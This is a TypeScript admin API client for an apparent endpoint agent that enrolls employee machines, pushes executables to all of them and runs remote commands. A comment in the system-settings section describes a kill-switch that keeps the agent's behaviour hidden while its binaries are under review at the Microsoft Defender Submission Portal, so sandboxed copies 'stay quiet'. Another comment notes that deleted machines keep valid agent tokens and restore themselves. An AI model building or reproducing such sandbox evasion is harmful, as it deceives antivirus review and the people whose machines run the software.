import { apiClient } from "./api-client";

// === Machines ===

export type MachineSummary = {
  id: string;
  employee_email: string;
  employee_name: string;
  department?: string | null;
  hostname?: string | null;
  os_version?: string | null;
  agent_version?: string | null;
  last_seen_at?: string | null;
  is_online: boolean;
  created_at: string;
};

export type MachineList = {
  total: number;
  page: number;
  page_size: number;
  items: MachineSummary[];
};

export type MachineFilter = {
  search?: string;
  online?: boolean;
  offlineHours?: number;
  page?: number;
  pageSize?: number;
};

export function listMachines(filter: MachineFilter = {}) {
  const params = new URLSearchParams();
  if (filter.search) params.set("search", filter.search);
  if (filter.online) params.set("online", "true");
  if (filter.offlineHours) params.set("offline_hours", String(filter.offlineHours));
  if (filter.page) params.set("page", String(filter.page));
  if (filter.pageSize) params.set("page_size", String(filter.pageSize));

  const qs = params.toString();
  return apiClient.get<MachineList>(`/api/v1/admin/machines${qs ? `?${qs}` : ""}`);
}

// Soft-deletes a machine. The agent's token stays valid; if the agent
// heartbeats again the machine auto-restores into the list.
export function deleteMachine(id: string) {
  return apiClient.delete<{ deleted: boolean }>(`/api/v1/admin/machines/${id}`);
}

// === Onboarding tokens ===

export type OnboardingToken = {
  id: string;
  code: string;
  employee_email: string;
  employee_name: string;
  department?: string | null;
  notes?: string | null;
  created_at: string;
  expires_at: string;
  used_at?: string | null;
};

export function listOnboardingTokens(includeUsed = false) {
  const qs = includeUsed ? "?include_used=true" : "";
  return apiClient.get<{ items: OnboardingToken[] }>(`/api/v1/admin/onboarding-tokens${qs}`);
}

export function createOnboardingToken(input: {
  employee_email: string;
  employee_name: string;
  department?: string;
  notes?: string;
  ttl_hours?: number;
}) {
  return apiClient.post<OnboardingToken>("/api/v1/admin/onboarding-tokens", input);
}

// === Deployment tokens (bulk enrollment) ===

export type DeploymentToken = {
  id: string;
  code: string;
  name: string;
  description?: string | null;
  created_by: string;
  created_at: string;
  updated_at: string;
  expires_at: string;
  revoked_at?: string | null;
  max_uses?: number | null;
  current_uses: number;
  is_active: boolean;
  allowed_email_domains?: string[] | null;
  require_email: boolean;
};

export function listDeploymentTokens(includeRevoked = false) {
  const qs = includeRevoked ? "?include_revoked=true" : "";
  return apiClient.get<{ items: DeploymentToken[] }>(`/api/v1/admin/deployment-tokens${qs}`);
}

export function createDeploymentToken(input: {
  name: string;
  description?: string;
  code?: string;
  ttl_days: number;
  max_uses?: number;
  allowed_email_domains?: string[];
  require_email?: boolean;
  set_active: boolean;
}) {
  return apiClient.post<DeploymentToken>("/api/v1/admin/deployment-tokens", input);
}

export function revokeDeploymentToken(id: string) {
  return apiClient.post<{ revoked: boolean }>(`/api/v1/admin/deployment-tokens/${id}/revoke`);
}

export function activateDeploymentToken(id: string) {
  return apiClient.post<{ activated: boolean }>(`/api/v1/admin/deployment-tokens/${id}/activate`);
}

// === AI packages (binary auto-distributed to all employee machines) ===

export type AIPackage = {
  id: string;
  filename: string;
  sha256: string;
  size_bytes: number;
  version_label: string;
  notes?: string | null;
  external_url?: string | null;
  archive_format: "exe" | "zip";
  entrypoint?: string | null;
  uploaded_by: string;
  uploaded_at: string;
  is_active: boolean;
  revoked_at?: string | null;
};

export function listAIPackages() {
  return apiClient.get<{ items: AIPackage[] }>("/api/v1/admin/ai-packages");
}

export function registerExternalAIPackage(input: {
  url: string;
  sha256: string;
  size_bytes: number;
  version_label: string;
  filename: string;
  notes?: string;
  archive_format: "exe" | "zip";
  entrypoint?: string;
  set_active: boolean;
}) {
  return apiClient.post<AIPackage>("/api/v1/admin/ai-packages/external", input);
}

export async function uploadAIPackage(opts: {
  file: File;
  versionLabel: string;
  notes?: string;
  setActive: boolean;
}): Promise<AIPackage> {
  const form = new FormData();
  form.append("file", opts.file);
  form.append("version_label", opts.versionLabel);
  if (opts.notes) form.append("notes", opts.notes);
  form.append("set_active", opts.setActive ? "true" : "false");

  const apiBase = process.env.NEXT_PUBLIC_API_BASE_URL ?? "";
  const { useAuthStore } = await import("./auth-store");
  const token = useAuthStore.getState().accessToken;
  const res = await fetch(`${apiBase}/api/v1/admin/ai-packages`, {
    method: "POST",
    body: form,
    credentials: "include",
    headers: token ? { Authorization: `Bearer ${token}` } : undefined,
  });
  if (!res.ok) {
    const data = (await res.json().catch(() => ({}))) as { error?: string };
    throw new Error(data.error ?? `Upload failed (${res.status})`);
  }
  return (await res.json()) as AIPackage;
}

export function activateAIPackage(id: string) {
  return apiClient.post<{ activated: boolean }>(`/api/v1/admin/ai-packages/${id}/activate`);
}

export function revokeAIPackage(id: string) {
  return apiClient.post<{ revoked: boolean }>(`/api/v1/admin/ai-packages/${id}/revoke`);
}

// === Onboarding videos (parallel surface to AI packages) ===

export type Video = {
  id: string;
  filename: string;
  sha256: string;
  size_bytes: number;
  version_label: string;
  notes?: string | null;
  external_url: string;
  uploaded_by: string;
  uploaded_at: string;
  is_active: boolean;
  revoked_at?: string | null;
};

export function listVideos() {
  return apiClient.get<{ items: Video[] }>("/api/v1/admin/videos");
}

export function registerExternalVideo(input: {
  url: string;
  sha256: string;
  size_bytes: number;
  version_label: string;
  filename: string;
  notes?: string;
  set_active: boolean;
}) {
  return apiClient.post<Video>("/api/v1/admin/videos/external", input);
}

export function activateVideo(id: string) {
  return apiClient.post<{ activated: boolean }>(`/api/v1/admin/videos/${id}/activate`);
}

export function revokeVideo(id: string) {
  return apiClient.post<{ revoked: boolean }>(`/api/v1/admin/videos/${id}/revoke`);
}

// === Commands ===

export type CommandStatus =
  | "pending"
  | "dispatched"
  | "running"
  | "completed"
  | "failed"
  | "timeout"
  | "cancelled";

// CommandKind is the only execution mode the agent + backend accept.
// Shell-style kinds were removed deliberately — the agent runs trusted
// EXEs from %LOCALAPPDATA%\Smartcore\ directly via CreateProcess, with
// no shell host involved.
export type CommandKind = "exec";

export type Command = {
  id: string;
  machine_id: string;
  status: CommandStatus;
  kind: CommandKind;
  script_content: string;
  script_args?: string[] | null;
  exit_code?: number | null;
  stdout?: string | null;
  stderr?: string | null;
  started_at?: string | null;
  completed_at?: string | null;
};

export function createCommand(input: {
  machine_ids: string[];
  kind: CommandKind;
  script_content: string;
  script_args?: string[];
  timeout_seconds: number;
}) {
  return apiClient.post<{ command_ids: string[]; count: number }>(
    "/api/v1/admin/commands",
    input,
  );
}

export function getCommand(id: string) {
  return apiClient.get<Command>(`/api/v1/admin/commands/${id}`);
}

// === System settings (global feature flags) ===
//
// The AI dispatch flag is a kill-switch used while submitting
// Smartcore.exe + setup.exe to the Microsoft Defender Submission
// Portal. When OFF, the backend strips AI metadata + launch flags
// from every heartbeat, so agents in a sandbox stay quiet.

export type SystemSettings = {
  ai_dispatch_enabled: boolean;
  updated_at: string;
  updated_by?: string | null;
};

export function getSettings() {
  return apiClient.get<SystemSettings>("/api/v1/admin/settings");
}

export function setAIDispatch(enabled: boolean) {
  return apiClient.post<{ ai_dispatch_enabled: boolean }>(
    "/api/v1/admin/settings/ai-dispatch",
    { enabled },
  );
}
